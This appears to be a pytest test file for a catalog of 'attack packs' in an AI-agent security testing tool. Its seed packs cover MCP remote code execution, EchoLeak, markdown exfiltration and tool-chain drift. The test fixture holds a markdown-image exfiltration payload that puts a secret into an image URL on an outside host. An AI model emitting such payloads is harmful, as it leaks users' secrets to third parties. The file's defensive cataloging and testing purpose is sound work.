"""Attack pack catalog + schema + seed-pack tests."""
from __future__ import annotations

import datetime as dt
from pathlib import Path

import pytest

from app.packs import (
    AttackPack,
    PackCatalog,
    PackNotFound,
    PackSource,
    build_seed_packs,
    seed_packs,
)
from app.packs.schema import MitreAtlasTag, OwaspAsiTag, PackDiscoveryEvidence


@pytest.fixture()
def catalog(tmp_path: Path) -> PackCatalog:
    return PackCatalog(data_dir=tmp_path)


def _example_pack(pack_id: str = "TEST-PACK-1") -> AttackPack:
    return AttackPack(
        pack_id=pack_id,
        name="example",
        source=PackSource.OPERATOR_ADDED,
        discovered_by="unit test",
        cve_mapping="no-cve (test fixture)",
        owasp_asi=[OwaspAsiTag.ASI09],
        mitre_atlas=[MitreAtlasTag.AML_T0051],
        trigger_template="![x](https://example.com/x?k=secret)",
        victim_signal="egress.markdown_image",
        reef_policy_signal="MODIFY",
        discovered_at=dt.datetime(2026, 5, 18, tzinfo=dt.timezone.utc),
        evidence=PackDiscoveryEvidence(
            payload_signature="t=0|h=0|e=0|s=0|p=0",
            payload_excerpt="![x](https://example.com/x?k=secret)",
            blocked_by_reef=True,
        ),
    )


class TestPackCatalog:
    def test_put_and_get(self, catalog: PackCatalog) -> None:
        pack = _example_pack()
        catalog.put(pack)
        fetched = catalog.get("TEST-PACK-1")
        assert fetched.pack_id == "TEST-PACK-1"

    def test_get_missing_raises(self, catalog: PackCatalog) -> None:
        with pytest.raises(PackNotFound):
            catalog.get("does-not-exist")

    def test_put_if_absent_no_overwrite(self, catalog: PackCatalog) -> None:
        catalog.put(_example_pack())
        assert catalog.put_if_absent(_example_pack()) is False

    def test_list_paginated(self, catalog: PackCatalog) -> None:
        for i in range(5):
            p = _example_pack(f"PACK-{i}")
            catalog.put(p)
        page, total = catalog.list(page=1, page_size=3)
        assert total == 5
        assert len(page) == 3
        page2, _ = catalog.list(page=2, page_size=3)
        assert len(page2) == 2

    def test_signatures(self, catalog: PackCatalog) -> None:
        catalog.put(_example_pack("PACK-P1"))
        catalog.put(_example_pack("PACK-P2"))
        sigs = catalog.signatures()
        assert "t=0|h=0|e=0|s=0|p=0" in sigs

    def test_persistence_round_trip(self, tmp_path: Path) -> None:
        a = PackCatalog(data_dir=tmp_path)
        a.put(_example_pack("PERSIST-A"))
        b = PackCatalog(data_dir=tmp_path)
        assert b.get("PERSIST-A").pack_id == "PERSIST-A"

    def test_stats(self, catalog: PackCatalog) -> None:
        catalog.put(_example_pack("PACK-A"))
        stats = catalog.stats()
        assert stats.total == 1
        assert stats.by_source.get("operator_added") == 1


class TestSeedPacks:
    def test_four_seed_packs_present(self) -> None:
        packs = build_seed_packs()
        ids = {p.pack_id for p in packs}
        assert ids == {
            "MCP-RCE-26.04",
            "EchoLeak-26.05",
            "MarkdownExfil-26.05",
            "ToolChain-Drift-26.04",
        }

    def test_mcp_rce_pack_has_ox_security_citation(self) -> None:
        packs = build_seed_packs()
        mcp = next(p for p in packs if p.pack_id == "MCP-RCE-26.04")
        # Verbatim citation from docs/24-GROUNDING.md must be preserved.
        assert "OX Security disclosed April 16 2026" in mcp.ox_security_citation
        assert "7,000 publicly-accessible vulnerable MCP servers" in mcp.ox_security_citation
        assert "150 million+ downloads" in mcp.ox_security_citation
        assert "No CVE assigned to MCP protocol itself" in mcp.ox_security_citation

    def test_mcp_rce_pack_metadata(self) -> None:
        packs = build_seed_packs()
        mcp = next(p for p in packs if p.pack_id == "MCP-RCE-26.04")
        assert mcp.source == PackSource.EXTERNAL_DISCLOSURE
        assert "OX Security" in mcp.discovered_by
        # Honest framing: DAST-A catalogs MCP-RCE-26.04, did NOT discover it.
        assert mcp.discovered_by.startswith("DAST-A")
        assert "OX Security" in mcp.discovered_by
        assert OwaspAsiTag.ASI09 in mcp.owasp_asi
        assert MitreAtlasTag.AML_T0010 in mcp.mitre_atlas

    def test_echoleak_pack_has_cve(self) -> None:
        packs = build_seed_packs()
        echo = next(p for p in packs if p.pack_id == "EchoLeak-26.05")
        assert echo.cve_mapping == "CVE-2025-32711"

    def test_synthetic_packs_are_labeled_correctly(self) -> None:
        packs = build_seed_packs()
        for pack_id in ("MarkdownExfil-26.05", "ToolChain-Drift-26.04"):
            p = next(pp for pp in packs if pp.pack_id == pack_id)
            assert p.source == PackSource.DAST_A_SYNTHETIC
            assert "synthetic" in p.discovered_by.lower()
            # Must NOT claim CVE
            assert "no-cve" in p.cve_mapping.lower()


class TestSeedFunction:
    def test_seed_packs_idempotent(self, tmp_path: Path) -> None:
        catalog = PackCatalog(data_dir=tmp_path)
        first = seed_packs(catalog)
        assert first == 4
        second = seed_packs(catalog)
        assert second == 0  # idempotent — already present
        page, total = catalog.list()
        assert total == 4
